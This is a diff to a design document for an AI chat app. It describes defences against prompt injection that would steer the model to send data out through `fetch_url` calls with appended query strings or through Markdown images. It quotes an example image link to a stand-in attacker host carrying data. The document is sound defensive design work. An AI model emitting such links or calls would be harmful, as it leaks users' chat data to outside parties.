@@ -484,6 +484,15 @@ The sidebar search (every word must match) doesn't suit model queries.
   `memory` gets `requiresApproval: 'after-untrusted'`: once a chat's history
   holds untrusted output, memory changes there wait for Approve / Deny. The
   whole chat counts, since that text stays in the context for later turns.
+  Text from others can also steer the model to send data out. Two channels
+  are closed: `fetch_url` is `'after-untrusted'` too, but a call the model
+  can't have made up runs (`Tool.askAfterUntrusted`: an address the user wrote
+  or a web search returned, exactly; anything added to one, such as
+  `?d=<data>`, asks), and the app's pages carry
+  `Content-Security-Policy: img-src 'self' data: blob:` while the Markdown
+  renderer shows an image from another site as a link, because a browser that
+  loads `![](https://evil.example/c?d=…)` has sent the data without a click.
+  `tests/e2e/exfiltration.spec.ts` and the opt-in `injection.test.ts` check both.
 - **`search_chats`** (`query`, optional `after` / `before` ISO dates): any word
   matches (prefix), ranked by relevance, best hit per chat, top 5, archived
   included, temporary and the current chat excluded. Returns JSON with chat
